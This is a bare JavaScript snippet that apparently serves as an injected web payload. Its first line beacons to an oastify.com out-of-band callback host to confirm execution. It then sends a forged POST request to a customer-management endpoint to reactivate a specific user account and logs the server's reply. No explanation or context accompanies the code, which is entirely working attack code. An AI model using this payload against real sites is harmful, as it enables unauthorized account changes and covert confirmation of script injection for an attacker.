var i=new Image; i.src="https://woofqtd0gp8c51iuv5scwmttyk4es4gt.oastify.com/";

fetch('/Home/ManageCustomer.asmx/ReactiveUser', {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ "userId": "109320" })
})
   .then(response => response.json())
   .then(response => console.log(JSON.stringify(response)))


